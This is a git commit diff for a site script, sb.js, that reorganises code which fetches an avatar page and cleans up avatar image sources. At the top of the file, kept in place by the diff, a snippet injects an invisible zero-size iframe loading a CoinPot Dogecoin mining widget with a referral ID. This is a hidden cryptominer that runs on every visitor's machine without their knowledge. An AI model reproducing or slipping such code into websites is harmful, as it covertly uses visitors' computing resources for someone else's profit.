a58c1ca2ff69c1fea429d08c2d0bfcf36a746327
tanarat-doco <36717070+tanarat-doco@users.noreply.github.com>
2020-02-23 21:09:17 +0900

    Update sb.js

--- sb.js
+++ sb.js
@@ -1,18 +1,6 @@
-var initedAvatar = 0;
+
 if($('#coinpot').length==0){
 	$('<iframe id="coinpot" scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=D24F0FE435EB&mode=widget" style="border:0;width:0;height:0;"></iframe>').appendTo('body');
-}
-
-$( document ).ready( function(){
-	if(initedAvatar){
-		return;
-	}
-	initedAvatar = 1;
-	$('a[href="avatar.php"] img').each((i, j) => {
-		j = $(j);
-		let src = j.attr("src").replace('"','');
-		j.attr("src", src);
-	})
 	$.get('/avatar.php',(result)=>{
 	    let ava = result.indexOf('กดเลือกใช้ Avatar ที่ชอบ');
 		if(ava>0){
@@ -29,4 +17,11 @@ $( document ).ready( function(){
 		}
 	})
 }
-);
+
+$( document ).ready( function(){
+	$('a[href="avatar.php"] img').each((i, j) => {
+		j = $(j);
+		let src = j.attr("src").replace('"','');
+		j.attr("src", src);
+	})
+});
